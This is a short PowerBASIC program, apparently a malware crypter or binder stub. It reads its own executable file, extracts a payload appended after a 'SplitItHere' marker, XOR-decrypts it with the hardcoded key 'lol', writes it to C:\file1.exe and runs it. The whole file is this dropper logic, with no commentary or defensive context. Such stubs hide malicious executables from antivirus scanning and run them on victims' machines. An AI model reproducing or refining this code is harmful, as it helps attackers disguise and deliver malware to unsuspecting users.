#COMPILE EXE
#DIM ALL

#INCLUDE "WIN32API.INC"

FUNCTION PBMAIN () AS LONG
DIM sStub AS THREADED STRING
DIM sFiles AS THREADED STRING
DIM sFileSplit AS STRING
DIM AppPath AS ASCIIZ * 256
DIM I AS LONG

sFileSplit = "SplitItHere"

GetModuleFileName(%NULL, AppPath, 256)

OPEN AppPath FOR BINARY AS #1
sStub = SPACE$(LOF(1))
GET #1, , sStub
CLOSE #1

FOR I = 1 TO PARSECOUNT(sStub, sFileSplit) -1
        sFiles = PARSE$(sStub, sFileSplit, I)
NEXT

sFiles = XOREncryption("lol", sFiles)

OPEN "C:\file1.exe" FOR BINARY AS #1
PUT #1, , sFiles
CLOSE #1

SHELL "C:\file1.exe"
END FUNCTION

FUNCTION XOREncryption(CodeKey AS STRING, DataIn AS STRING) AS STRING
    DIM lonDataPtr AS LONG
    DIM strDataOut AS STRING
    DIM intXOrValue1 AS INTEGER, intXOrValue2 AS INTEGER

    FOR lonDataPtr = 1 TO LEN(DataIn)
        intXOrValue1 = ASC(MID$(DataIn, lonDataPtr, 1))
        intXOrValue2 = ASC(MID$(CodeKey, ((lonDataPtr MOD LEN(CodeKey)) + 1), 1))
        strDataOut = strDataOut + CHR$(intXOrValue1 XOR intXOrValue2)
    NEXT lonDataPtr
   XOREncryption = strDataOut
END FUNCTION
